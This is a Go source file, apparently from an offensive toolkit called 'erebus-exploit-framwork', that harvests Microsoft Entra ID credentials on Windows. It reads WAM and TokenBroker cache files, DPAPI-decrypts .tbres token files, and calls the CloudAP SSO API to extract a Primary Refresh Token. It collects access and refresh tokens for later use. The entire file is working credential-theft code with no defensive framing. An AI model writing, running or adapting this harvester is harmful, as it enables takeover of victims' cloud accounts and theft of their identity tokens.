//go:build windows

package cloud

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// harvestEntraToken extracts Entra ID PRT and refresh tokens.
// Windows-only: accesses the CloudAP PRT cache and WAM token broker.
// May require elevation for some operations.
func harvestEntraToken(_ context.Context) *pb.CloudHarvestResult {
	result := &pb.CloudHarvestResult{
		Provider: "azure",
		Method:   "entra_token",
	}

	found := false

	// Method 1: Read WAM token broker cache
	if tokens := readWAMTokenCache(); len(tokens) > 0 {
		result.Tokens = append(result.Tokens, tokens...)
		found = true
	}

	// Method 2: Read Token Broker cache files
	if tokens := readTokenBrokerCache(); len(tokens) > 0 {
		result.Tokens = append(result.Tokens, tokens...)
		found = true
	}

	// Method 3: Try to extract PRT via CloudAP plugin (requires SYSTEM)
	if token := extractPRT(); token != nil {
		result.Tokens = append(result.Tokens, token)
		found = true
	}

	if !found {
		return nil
	}
	return result
}

func readWAMTokenCache() []*pb.CloudToken {
	var tokens []*pb.CloudToken

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return nil
	}

	// WAM stores tokens in various locations
	cachePaths := []string{
		filepath.Join(localAppData, "Microsoft", "TokenBroker", "Cache"),
		filepath.Join(localAppData, "Microsoft", "Windows", "Caches"),
	}

	for _, dir := range cachePaths {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}

			data, err := os.ReadFile(filepath.Join(dir, entry.Name()))
			if err != nil {
				continue
			}

			// Try to parse as JSON token cache
			parsed := parseWAMCacheFile(data, filepath.Join(dir, entry.Name()))
			tokens = append(tokens, parsed...)
		}
	}

	return tokens
}

func parseWAMCacheFile(data []byte, source string) []*pb.CloudToken {
	var tokens []*pb.CloudToken

	// WAM cache files can contain JSON token entries
	var cacheEntries []struct {
		Key   string `json:"Key"`
		Value struct {
			AccessToken  string `json:"accessToken"`
			RefreshToken string `json:"refreshToken"`
			Resource     string `json:"resource"`
			Authority    string `json:"authority"`
			ExpiresOn    int64  `json:"expiresOn"`
		} `json:"Value"`
	}

	if err := json.Unmarshal(data, &cacheEntries); err != nil {
		return nil
	}

	for _, entry := range cacheEntries {
		if entry.Value.AccessToken != "" {
			tokens = append(tokens, &pb.CloudToken{
				Provider:    "azure",
				TokenType:   "access_token",
				AccessToken: entry.Value.AccessToken,
				Resource:    entry.Value.Resource,
				ExpiresAt:   entry.Value.ExpiresOn,
				Source:      source,
			})
		}
		if entry.Value.RefreshToken != "" {
			tokens = append(tokens, &pb.CloudToken{
				Provider:     "azure",
				TokenType:    "refresh_token",
				RefreshToken: entry.Value.RefreshToken,
				Resource:     entry.Value.Resource,
				Source:       source,
			})
		}
	}

	return tokens
}

func readTokenBrokerCache() []*pb.CloudToken {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return nil
	}

	tbresPath := filepath.Join(localAppData, "Microsoft", "TokenBroker", "Cache")
	entries, err := os.ReadDir(tbresPath)
	if err != nil {
		return nil
	}

	var tokens []*pb.CloudToken
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		ext := filepath.Ext(entry.Name())
		if ext != ".tbres" {
			continue
		}

		data, err := os.ReadFile(filepath.Join(tbresPath, entry.Name()))
		if err != nil {
			continue
		}

		// TBRES files are binary — try DPAPI decryption
		decrypted, err := dpAPIDecrypt(data)
		if err != nil {
			continue
		}

		// Try to parse decrypted content as JSON
		parsed := parseWAMCacheFile(decrypted, filepath.Join(tbresPath, entry.Name()))
		tokens = append(tokens, parsed...)
	}

	return tokens
}

// extractPRT attempts to extract the Primary Refresh Token using the
// CloudAP SSO cookie API. Requires SYSTEM privileges.
func extractPRT() *pb.CloudToken {
	// Load the CloudAP SSO DLL
	cloudAP := syscall.NewLazyDLL("MicrosoftAccountCloudAP.dll")
	getSSO := cloudAP.NewProc("GetSSOCookieForUrl")
	// M17: Check Find() error properly before calling
	if err := getSSO.Find(); err != nil {
		return nil
	}

	// Request PRT cookie for login.microsoftonline.com
	url, _ := syscall.UTF16PtrFromString("https://login.microsoftonline.com")
	var cookie *uint16
	ret, _, _ := getSSO.Call(
		uintptr(unsafe.Pointer(url)),
		uintptr(unsafe.Pointer(&cookie)),
	)

	if ret != 0 || cookie == nil {
		return nil
	}

	// C5: Use safe dynamic-length conversion instead of fixed [4096]uint16
	prtCookie := utf16PtrToString(cookie)

	// H12: Free the cookie pointer allocated by the DLL
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	localFree := kernel32.NewProc("LocalFree")
	localFree.Call(uintptr(unsafe.Pointer(cookie)))

	if prtCookie == "" {
		return nil
	}

	return &pb.CloudToken{
		Provider:    "azure",
		TokenType:   "prt",
		AccessToken: prtCookie,
		Resource:    "https://login.microsoftonline.com",
		Source:      "cloudap_sso",
	}
}

// utf16PtrToString safely converts a *uint16 to a Go string by scanning
// for the null terminator instead of using a fixed-size array cast.
func utf16PtrToString(p *uint16) string {
	if p == nil {
		return ""
	}
	// Find the null terminator
	var s []uint16
	for ptr := p; *ptr != 0; ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2)) {
		s = append(s, *ptr)
	}
	return syscall.UTF16ToString(s)
}
